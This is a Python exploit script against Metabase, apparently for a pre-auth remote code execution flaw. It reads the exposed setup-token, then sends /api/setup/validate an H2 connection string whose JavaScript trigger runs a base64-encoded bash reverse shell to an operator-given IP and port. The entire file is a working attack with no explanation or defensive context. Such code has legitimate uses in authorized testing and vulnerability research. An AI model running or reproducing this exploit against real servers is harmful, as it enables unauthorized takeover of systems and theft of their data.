import requests
import json
import argparse
import base64
from string import ascii_uppercase
import random


def encode_to_b64(payload: str) -> str:
    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')

    if equals_count >= 1:
        encoded_payload = base64.b64encode(f'{payload + " " * equals_count}'.encode('ascii')).decode()

    return encoded_payload



parser= argparse.ArgumentParser()
parser.add_argument("-u","--url",required=True,help="Target URL(Where meta Metabase is Hosted)")
parser.add_argument("-ip","--ip",required=True,help="IP address to get Reverse Shell on")
parser.add_argument("-p","--port",required=True,help="Port")

args = parser.parse_args()

command = f'bash -i >& /dev/tcp/{args.ip}/{args.port} 0>&1'
b64command = encode_to_b64(command)

token_url=  args.url +"/api/session/properties"
exploit_url = args.url + "/api/setup/validate"


print(f'[+]  Getting setup-token from {token_url}')

response = requests.get(token_url)
json_data = response.json()
token = json_data.get("setup-token")
print(f'[+]  Found setup-token, token =  {token}')




headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}



payload = {
    "token": token,
    "details": {
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{b64command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string = ''.join(random.choice(ascii_uppercase) for i in range(12)), b64command=b64command),
            "advanced-options": False,
            "ssl": True
        },
        "name": "x",
        "engine": "h2"
    }
}

print('[+]  Sending payload')
print(f'[+]  Getting Reverse Shell on {args.ip}:{args.port}')

request = requests.post(exploit_url, json=payload, headers=headers)
